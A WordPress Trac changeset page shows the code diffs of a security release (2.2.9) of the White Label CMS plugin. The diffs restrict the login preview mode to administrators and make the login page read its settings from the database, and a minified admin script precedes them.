mode</div>'),t.find("a").each((function(){jQuery(this).attr("href","#")}))}))}})})),jQuery(".wlcms-select2").select2({width:"100%",placeholder:"Select"})})),jQuery.validator.addMethod("feedurl",(function(e,t){return this.optional(t)||/^(?:(?:(?:https?|ftp|feed):)?\/\/)(?:\S+(?::\S\*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-\*)\*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-\*)\*[a-z\u00a1-\uffff0-9]+)\*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S\*)?$/i.test(e)}),"Please use a valid URL"),jQuery.validator.messages.url="Please use a valid URL",jQuery(document).ready((function(){jQuery('.main-toggle[type="checkbox"]').change((function(e){var t=jQuery(this).prop("checked"),i=jQuery(this).attr("data-revised"),r=jQuery(this).parents(".toggle-group").find(".sub-fields");r.length&&(t&&"1"!=i&&r.find('input[type="checkbox"]:checked').length==r.find('input[type="checkbox"]').length||!t&&"1"==i?r.hide():r.show())})).trigger("change"),jQuery(".wlcms-toggle-arrow").on("click",(function(){jQuery(this).toggleClass("active"),jQuery(this).next("ul").slideToggle()})),jQuery("#enable\_wlcms\_admin").on("change",(function(){jQuery(this).is(":checked")?jQuery(".menu-admin-wrapper").show():jQuery(".menu-admin-wrapper").hide()})).trigger("change"),jQuery(".enable\_welcome\_for\_all\_roles").on("change",(function(){var e=jQuery("#select\_user\_roles"+jQuery(this).data("section"));jQuery(this).is(":checked")?e.hide():e.show()})).trigger("change"),jQuery('.wlcms-toggle[type="checkbox"]').change((function(e){var t=jQuery(this).prop("checked"),i=jQuery(this).parent();i.siblings();i.find('input[type="checkbox"]').prop({checked:t}),function e(i){var r=i.parent().parent(),n=!0;if(i.siblings().each((function(){return n=jQuery(this).children('input[type="checkbox"]').prop("checked")===t})),n&&t)r.children('input[type="checkbox"]').prop({checked:t}),e(r);else if(n&&!t)r.children('input[type="checkbox"]').prop("checked",t),r.children('input[type="checkbox"]').prop("indeterminate",r.find('input[type="checkbox"]:checked').length>0),e(r);else{var s=!0;i.parents("li").children('input[type="checkbox"]').hasClass("main-toggle-reverse")&&(s=!1),i.parents("li").children('input[type="checkbox"]').prop({checked:s})}}(i)})),jQuery(".wlcms-menus-settings > ul > li").each((function(){jQuery(this).find('input[type="checkbox"]:checked').length==jQuery(this).find('input[type="checkbox"]').length?jQuery(this).find("ul.sub\_menu\_wrapper").hide():jQuery(this).find("ul.sub\_menu\_wrapper").show()}));jQuery(".wlcms-form").validate({ignore:".ignore",rules:{rss\_feed\_address:{required:!1,feedurl:!0}},invalidHandler:function(e,t){var r=t.errorList;jQuery(".wlcms-navigation ul li span").remove();var n=[];for(i=0;i<r.length;i++){var s=r[i].element,a=jQuery(s).closest("section").attr("id");-1===n.indexOf(a)&&n.push(a),console.log(a)}for(i=0;i<n.length;i++)jQuery(".wlcms-navigation ul li a#wlcms\_tab-"+n[i]).append('<span class="dashicons dashicons-no-alt"></span>');var c=t.numberOfInvalids();if(c){var l=1==c?"You missed 1 field. It has been highlighted":"You missed "+c+" fields. They have been highlighted";jQuery("div.wlcms\_messages span").html(l),jQuery("div.wlcms\_messages").show()}else jQuery("div.wlcms\_messages").hide()}});jQuery(".template\_type").on("change",(function(){var e=jQuery(this).data("template\_type"),t=jQuery(".template\_type"+e).filter(":checked"),i=t.data("page\_type");if("html"==t.val()){if(jQuery(".welcome-basicHtml"+e).show(),jQuery(".welcome-page"+e).hide(),jQuery(".welcome-basicHtml"+e+" .welcome\_panel\_fullwidth").is(":checked"))return void jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show();jQuery(".wlcms\_welcome\_panel\_dismissible"+e).hide()}else jQuery(".wlcms\_welcome\_panel\_dismissible"+e).show(),jQuery(".welcome-basicHtml"+e).hide(),jQuery(".welcome-page"+e).show(),"beaver"==i?(jQuery(".beaver\_page"+e).next().show(),jQuery(".elementor\_page"+e).next().hide()):(jQuery(".beaver\_page"+e).next().hide(),jQuery(".elementor\_page"+e).next().show())})),jQuery(".template\_type").trigger("change"),jQuery("form.wlcms-advert").on("submit",(function(){var e=jQuery("#ad-authorize").is(":checked"),t=jQuery("#inf\_custom\_GDPR");t.val(e+" "+t.data("date"))}))}))},,,,,function(e,t){},,,,,function(e,t){}]); |
* ## [white-label-cms/trunk/changelog.txt](/changeset/2672615/white-label-cms/trunk/changelog.txt "Show the changeset 2672615 restricted to white-label-cms/trunk/changelog.txt")

  | [r2670965](/browser/white-label-cms/trunk/changelog.txt?rev=2670965#L1 "Show revision 2670965 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/changelog.txt?rev=2672615#L1 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | == Changelog == |
  | 2 | 2 |  |
  |  | 3 | = 2.2.8 = |
  |  | 4 | \* Improved: Plugin security. Thanks to Erwan of WPScan |
  | 3 | 5 |  |
  | 4 | 6 | = 2.2.7 = |
* ## [white-label-cms/trunk/includes/Functions.php](/changeset/2672615/white-label-cms/trunk/includes/Functions.php "Show the changeset 2672615 restricted to white-label-cms/trunk/includes/Functions.php")

  | [r2563959](/browser/white-label-cms/trunk/includes/Functions.php?rev=2563959#L9 "Show revision 2563959 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/includes/Functions.php?rev=2672615#L9 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 9 | 9 | } |
  | 10 | 10 |  |
  | 11 |  | $value = wlcms()->Settings()->get($key, $default); |
  | 12 |  | return $value; |
  |  | 11 | return wlcms\_db\_field\_setting($key, $default); |
  |  | 12 | } |
  |  | 13 | } |
  |  | 14 |  |
  |  | 15 | if (!function\_exists('wlcms\_db\_field\_setting')) { |
  |  | 16 | function wlcms\_db\_field\_setting($key = "", $default = false) |
  |  | 17 | { |
  |  | 18 | return wlcms()->Settings()->get($key, $default); |
  | 13 | 19 | } |
  | 14 | 20 | } |
* ## [white-label-cms/trunk/includes/classes/Admin\_Dashboard.php](/changeset/2672615/white-label-cms/trunk/includes/classes/Admin_Dashboard.php "Show the changeset 2672615 restricted to white-label-cms/trunk/includes/classes/Admin_Dashboard.php")

  | [r2666599](/browser/white-label-cms/trunk/includes/classes/Admin_Dashboard.php?rev=2666599#L78 "Show revision 2666599 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/includes/classes/Admin_Dashboard.php?rev=2672615#L78 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 78 | 78 | array( |
  | 79 | 79 | 'max-width' => 'none!important', |
  | 80 |  | 'margin-left' => '0!important' |
  |  | 80 | 'margin-left' => '0!important', |
  |  | 81 | 'justify-content' => 'flex-start', |
  |  | 82 | 'min-height' => 'auto' |
  | 81 | 83 | ) |
  | 82 | 84 | ); |
* ## [white-label-cms/trunk/includes/classes/Login.php](/changeset/2672615/white-label-cms/trunk/includes/classes/Login.php "Show the changeset 2672615 restricted to white-label-cms/trunk/includes/classes/Login.php")

  | [r2670965](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L10 "Show revision 2670965 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L10 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 10 | 10 |  |
  | 11 | 11 | add\_action('login\_footer', array($this, 'scripts'), 1000); |
  |  | 12 | add\_action('init', array($this, 'preview\_init')); |
  | 12 | 13 |  |
  | 13 | 14 | add\_action('wlcms\_before\_save\_preview', array($this, 'save\_preview\_login'), 10, 2); |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L18) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L19) |  |
  | 18 | 19 |  |
  | 19 | 20 | add\_filter('wlcms\_setting\_fields', array($this, 'setting\_fields'), 11, 1); |
  |  | 21 | } |
  |  | 22 |  |
  |  | 23 |  |
  |  | 24 | public function preview\_init() |
  |  | 25 | { |
  |  | 26 |  |
  |  | 27 | if (!isset($\_GET['wlcms-action'])) { |
  |  | 28 | return; |
  |  | 29 | } |
  |  | 30 |  |
  |  | 31 | if ($\_GET['wlcms-action'] != 'preview') { |
  |  | 32 | return; |
  |  | 33 | } |
  |  | 34 |  |
  |  | 35 | if (current\_user\_can('manage\_options')) { |
  |  | 36 | return; |
  |  | 37 | } |
  |  | 38 |  |
  |  | 39 | wp\_die( \_\_( 'Sorry, you are not allowed to do this action.' ) ); |
  |  | 40 |  |
  | 20 | 41 | } |
  | 21 | 42 |  |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L42) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L63) |  |
  | 42 | 63 | public function scripts() |
  | 43 | 64 | { |
  | 44 |  |  |
  | 45 |  | ~~if (isset($\_GET['wlcms-action']) && $\_GET['wlcms-action'] == 'preview' && !is\_user\_logged\_in()) {~~ |
  | 46 |  | ~~return;~~ |
  | 47 |  | ~~}~~ |
  | 48 | 65 |  |
  | 49 | 66 | wp\_print\_scripts(array('jquery')); |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L77) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L94) |  |
  | 77 | 94 | { |
  | 78 | 95 | $js = 'jQuery("#login").wrap("<div id=\'wlcms-login-wrapper\'></div>");'; |
  | 79 |  | if ($this->get\_~~settings~~('login\_logo')) { |
  |  | 96 | if ($this->get\_db\_setting('login\_logo')) { |
  | 80 | 97 | $js .= ';jQuery(\'#login h1 a\').attr(\'title\',\'' . get\_bloginfo('name') . '\');jQuery(\'#login h1 a\').attr(\'href\',\'' . get\_bloginfo('url') . '\');'; |
  | 81 | 98 | } |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L86) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L103) |  |
  | 86 | 103 | { |
  | 87 | 104 | $logo\_css = '#login h1 a, .login h1 a { '; |
  | 88 |  | if ($login\_logo = $this->get\_~~settings~~('login\_logo')) { |
  |  | 105 | if ($login\_logo = $this->get\_db\_setting('login\_logo')) { |
  | 89 | 106 | $logo\_css .= 'background-image: url(' . $login\_logo . ');'; |
  | 90 | 107 | } |
  | 91 | 108 |  |
  | 92 | 109 | $has\_width = false; |
  | 93 |  | if ($logo\_width = $this->get\_~~settings~~('logo\_width')) { |
  |  | 110 | if ($logo\_width = $this->get\_db\_setting('logo\_width')) { |
  | 94 | 111 | $logo\_css .= 'width:' . wlcms\_css\_metrics($logo\_width) . ';'; |
  | 95 | 112 | $has\_width = true; |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L102) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L119) |  |
  | 102 | 119 |  |
  | 103 | 120 | $has\_height = false; |
  | 104 |  | if ($logo\_height = $this->get\_~~settings~~('logo\_height')) { |
  |  | 121 | if ($logo\_height = $this->get\_db\_setting('logo\_height')) { |
  | 105 | 122 | $has\_height = true; |
  | 106 | 123 | $logo\_css .= 'height:' . wlcms\_css\_metrics($logo\_height) . ';'; |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L114) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L131) |  |
  | 114 | 131 | $logo\_css .= $logo\_css\_background\_size; |
  | 115 | 132 |  |
  | 116 |  | if ($logo\_bottom\_margin = $this->get\_~~settings~~('logo\_bottom\_margin')) { |
  |  | 133 | if ($logo\_bottom\_margin = $this->get\_db\_setting('logo\_bottom\_margin')) { |
  | 117 | 134 | $logo\_css .= 'margin-bottom: ' . $logo\_bottom\_margin . 'px!important;'; |
  | 118 | 135 | } |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L120) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L137) |  |
  | 120 | 137 | $logo\_css .= '}'; // close #login h1 a, .login h1 a |
  | 121 | 138 |  |
  | 122 |  | if ($retina\_login\_logo = $this->get\_~~settings~~('retina\_login\_logo')) { |
  |  | 139 | if ($retina\_login\_logo = $this->get\_db\_setting('retina\_login\_logo')) { |
  | 123 | 140 | $logo\_css .= '@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) { |
  | 124 | 141 | #login h1 a, .login h1 a { background-image: url(' . $retina\_login\_logo . ');} |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L134) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L151) |  |
  | 134 | 151 | $body\_login = 'body.login{'; |
  | 135 | 152 |  |
  | 136 |  | if ($this->get\_~~settings~~('full\_screen\_background\_image')) { |
  |  | 153 | if ($this->get\_db\_setting('full\_screen\_background\_image')) { |
  | 137 | 154 | $body\_login .= '-webkit-background-size: cover !important;'; |
  | 138 | 155 | $body\_login .= '-moz-background-size: cover !important;'; |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L141) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L158) |  |
  | 141 | 158 | } |
  | 142 | 159 |  |
  | 143 |  | if ($background\_color = $this->get\_~~settings~~('background\_color')) { |
  |  | 160 | if ($background\_color = $this->get\_db\_setting('background\_color')) { |
  | 144 | 161 | $body\_login .= 'background-color:' . $background\_color . '!important;'; |
  | 145 | 162 | } |
  | 146 | 163 |  |
  | 147 |  | if ($background\_image = $this->get\_~~settings~~('background\_image')) { |
  |  | 164 | if ($background\_image = $this->get\_db\_setting('background\_image')) { |
  | 148 | 165 | $body\_login .= 'background-image: url(' . $background\_image . ');'; |
  | 149 | 166 | } |
  | 150 | 167 |  |
  | 151 |  | if ($background\_positions = $this->get\_~~settings~~('background\_positions')) { |
  |  | 168 | if ($background\_positions = $this->get\_db\_setting('background\_positions')) { |
  | 152 | 169 | $body\_login .= 'background-position:' . $background\_positions . ';'; |
  | 153 | 170 | } |
  | 154 | 171 |  |
  | 155 |  | if ($background\_repeat = $this->get\_~~settings~~('background\_repeat')) { |
  |  | 172 | if ($background\_repeat = $this->get\_db\_setting('background\_repeat')) { |
  | 156 | 173 | $body\_login .= 'background-repeat:' . $background\_repeat . ';'; |
  | 157 | 174 | } |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L166) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L183) |  |
  | 166 | 183 | $form\_css = ''; |
  | 167 | 184 |  |
  | 168 |  | if ($form\_label\_color = $this->get\_~~settings~~('form\_label\_color')) { |
  |  | 185 | if ($form\_label\_color = $this->get\_db\_setting('form\_label\_color')) { |
  | 169 | 186 | $form\_css .= '#loginform label{ color:' . $form\_label\_color . '}'; |
  | 170 | 187 | } |
  | 171 | 188 |  |
  | 172 |  | if ($form\_background\_color = $this->get\_~~settings~~('form\_background\_color')) { |
  |  | 189 | if ($form\_background\_color = $this->get\_db\_setting('form\_background\_color')) { |
  | 173 | 190 | $form\_css .= '#loginform{ background-color:' . $form\_background\_color . '}'; |
  | 174 | 191 | } |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L177) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L194) |  |
  | 177 | 194 | \* Submit Button css |
  | 178 | 195 | \*/ |
  | 179 |  | $form\_button\_text\_color = $this->get\_~~settings~~('form\_button\_text\_color'); |
  | 180 |  | $form\_button\_color = $this->get\_~~settings~~('form\_button\_color'); |
  |  | 196 | $form\_button\_text\_color = $this->get\_db\_setting('form\_button\_text\_color'); |
  |  | 197 | $form\_button\_color = $this->get\_db\_setting('form\_button\_color'); |
  | 181 | 198 |  |
  | 182 | 199 | if ($form\_button\_text\_color || $form\_button\_color) { |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L199) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L216) |  |
  | 199 | 216 | \* Submit Button Hover |
  | 200 | 217 | \*/ |
  | 201 |  | $form\_button\_text\_hover\_color = $this->get\_~~settings~~('form\_button\_text\_hover\_color'); |
  | 202 |  | $form\_button\_hover\_color = $this->get\_~~settings~~('form\_button\_hover\_color'); |
  |  | 218 | $form\_button\_text\_hover\_color = $this->get\_db\_setting('form\_button\_text\_hover\_color'); |
  |  | 219 | $form\_button\_hover\_color = $this->get\_db\_setting('form\_button\_hover\_color'); |
  | 203 | 220 |  |
  | 204 | 221 | if ($form\_button\_hover\_color || $form\_button\_text\_hover\_color) { |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L221) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L238) |  |
  | 221 | 238 | { |
  | 222 | 239 | $form\_css = ''; |
  | 223 |  | if ($this->get\_~~settings~~('hide\_register\_lost\_password')) { |
  |  | 240 | if ($this->get\_db\_setting('hide\_register\_lost\_password')) { |
  | 224 | 241 | $form\_css .= 'p#nav{display:none;}'; |
  | 225 | 242 | } |
  | 226 | 243 |  |
  | 227 |  | if ($this->get\_~~settings~~('hide\_back\_to\_link')) { |
  |  | 244 | if ($this->get\_db\_setting('hide\_back\_to\_link')) { |
  | 228 | 245 | $form\_css .= 'p#backtoblog{display:none;}'; |
  | 229 | 246 | } |
  | 230 | 247 |  |
  | 231 |  | if ($back\_to\_register\_link\_color = $this->get\_~~settings~~('back\_to\_register\_link\_color')) { |
  |  | 248 | if ($back\_to\_register\_link\_color = $this->get\_db\_setting('back\_to\_register\_link\_color')) { |
  | 232 | 249 | $form\_css .= 'p#backtoblog a, p#nav a{color:' . $back\_to\_register\_link\_color . '!important;}'; |
  | 233 | 250 | } |
  | 234 | 251 |  |
  | 235 |  | if ($back\_to\_register\_link\_hover\_color = $this->get\_~~settings~~('back\_to\_register\_link\_hover\_color')) { |
  |  | 252 | if ($back\_to\_register\_link\_hover\_color = $this->get\_db\_setting('back\_to\_register\_link\_hover\_color')) { |
  | 236 | 253 | $form\_css .= 'p#backtoblog a:hover, p#nav a:hover{color:' . $back\_to\_register\_link\_hover\_color . '!important;}'; |
  | 237 | 254 | } |
  | 238 | 255 |  |
  | 239 |  | if ($privacy\_policy\_link\_color = $this->get\_~~settings~~('privacy\_policy\_link\_color')) { |
  |  | 256 | if ($privacy\_policy\_link\_color = $this->get\_db\_setting('privacy\_policy\_link\_color')) { |
  | 240 | 257 | $form\_css .= 'a.privacy-policy-link{color:' . $privacy\_policy\_link\_color . '!important;text-decoration:none}'; |
  | 241 | 258 | } |
  | 242 | 259 |  |
  | 243 |  | if ($privacy\_policy\_link\_hover\_color = $this->get\_~~settings~~('privacy\_policy\_link\_hover\_color')) { |
  |  | 260 | if ($privacy\_policy\_link\_hover\_color = $this->get\_db\_setting('privacy\_policy\_link\_hover\_color')) { |
  | 244 | 261 | $form\_css .= 'a.privacy-policy-link:hover{color:' . $privacy\_policy\_link\_hover\_color . '!important;}'; |
  | 245 | 262 | } |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L250) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L267) |  |
  | 250 | 267 | private function set\_custom\_css() |
  | 251 | 268 | { |
  | 252 |  | $content = $this->get\_~~settings~~('login\_custom\_css'); |
  |  | 269 | $content = $this->get\_db\_setting('login\_custom\_css'); |
  | 253 | 270 |  |
  | 254 | 271 | $content = wp\_kses( $content, array( '\'', '\"' ) ); |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L259) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L276) |  |
  | 259 | 276 | private function set\_custom\_login\_js() |
  | 260 | 277 | { |
  | 261 |  | return wlcms\_esc\_html\_e($this->get\_settings('login\_custom\_js')); |
  | 262 |  | } |
  |  | 278 | return wlcms\_esc\_html\_e($this->get\_db\_setting('login\_custom\_js')); |
  |  | 279 | } |
  |  | 280 |  |
  | 263 | 281 | public function settings() |
  | 264 | 282 | { |
  | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2670965#L323) | […](/browser/white-label-cms/trunk/includes/classes/Login.php?rev=2672615#L341) |  |
  | 323 | 341 |  |
  | 324 | 342 | public function saving\_preview\_section() |
  | 325 |  | { |
  |  | 343 | { |
  | 326 | 344 | $sections = array('wizard', 'settings'); |
  | 327 | 345 |  |
* ## [white-label-cms/trunk/includes/classes/Previewable.php](/changeset/2672615/white-label-cms/trunk/includes/classes/Previewable.php "Show the changeset 2672615 restricted to white-label-cms/trunk/includes/classes/Previewable.php")

  | [r2030197](/browser/white-label-cms/trunk/includes/classes/Previewable.php?rev=2030197#L59 "Show revision 2030197 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/includes/classes/Previewable.php?rev=2672615#L59 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 59 | 59 | { |
  | 60 | 60 | // Prepend "\_" placeholder if in preview mode to get the preview login settings |
  |  | 61 | $key = $this->setting\_key($key); |
  |  | 62 |  |
  |  | 63 | return wlcms\_field\_setting($key); |
  |  | 64 | } |
  |  | 65 |  |
  |  | 66 | public function setting\_key($key) |
  |  | 67 | { |
  | 61 | 68 | if ($this->is\_preview) { |
  | 62 | 69 | $key = $this->preview\_setting\_key\_placeholder . $key; |
  | 63 | 70 | } |
  |  | 71 |  |
  |  | 72 | return $key; |
  |  | 73 | } |
  | 64 | 74 |  |
  | 65 |  | return wlcms\_field\_setting($key); |
  |  | 75 | public function get\_db\_setting($key) |
  |  | 76 | { |
  |  | 77 | return wlcms\_db\_field\_setting($this->setting\_key($key)); |
  | 66 | 78 | } |
  | 67 | 79 | } |
* ## [white-label-cms/trunk/readme.txt](/changeset/2672615/white-label-cms/trunk/readme.txt "Show the changeset 2672615 restricted to white-label-cms/trunk/readme.txt")

  | [r2670965](/browser/white-label-cms/trunk/readme.txt?rev=2670965#L68 "Show revision 2670965 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/readme.txt?rev=2672615#L68 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 68 | 68 |  |
  | 69 | 69 |  |
  | 70 |  | = 2.2.8 = |
  | 71 |  | \* Improved: Plugin security. Thanks to Erwan of WPScan |
  |  | 70 | = 2.2.9 = |
  |  | 71 | \* Improved: Plugin security. Thanks to Krzysztof Zając and WPScan |
  |  | 72 | \* Improved: Custom Dashboard for HTML wrapper justify-content |
  | 72 | 73 |  |
  | 73 | 74 | == Frequently Asked Questions == |
* ## [white-label-cms/trunk/wlcms-plugin.php](/changeset/2672615/white-label-cms/trunk/wlcms-plugin.php "Show the changeset 2672615 restricted to white-label-cms/trunk/wlcms-plugin.php")

  | [r2670965](/browser/white-label-cms/trunk/wlcms-plugin.php?rev=2670965#L4 "Show revision 2670965 of this file in browser") | [r2672615](/browser/white-label-cms/trunk/wlcms-plugin.php?rev=2672615#L4 "Show revision 2672615 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | Plugin URI: https://www.videousermanuals.com/white-label-cms/?utm\_campaign=wlcms&utm\_medium=plugin&utm\_source=readme-txt |
  | 5 | 5 | Description:  A plugin that allows you to brand WordPress CMS as your own |
  | 6 |  | Version: 2.2.~~8~~ |
  |  | 6 | Version: 2.2.9 |
  | 7 | 7 | Author: www.videousermanuals.com |
  | 8 | 8 | Author URI: https://www.videousermanuals.com/?utm\_campaign=wlcms&utm\_medium=plugin&utm\_source=readme-txt |
  | […](/browser/white-label-cms/trunk/wlcms-plugin.php?rev=2670965#L14) | […](/browser/white-label-cms/trunk/wlcms-plugin.php?rev=2672615#L14) |  |
  | 14 | 14 | if (!defined('ABSPATH')) exit; // Exit if accessed directly |
  | 15 | 15 |  |
  | 16 |  | define('WLCMS\_VERSION', '2.2.~~8~~'); |
  |  | 16 | define('WLCMS\_VERSION', '2.2.9'); |
  | 17 | 17 | define("WLCMS\_DIR", plugin\_dir\_path(\_\_FILE\_\_)); |
  | 18 | 18 | define("WLCMS\_ASSETS\_URL", plugin\_dir\_url(\_\_FILE\_\_) . 'assets/'); |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2672615)
* [Zip Archive](?format=zip&new=2672615)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


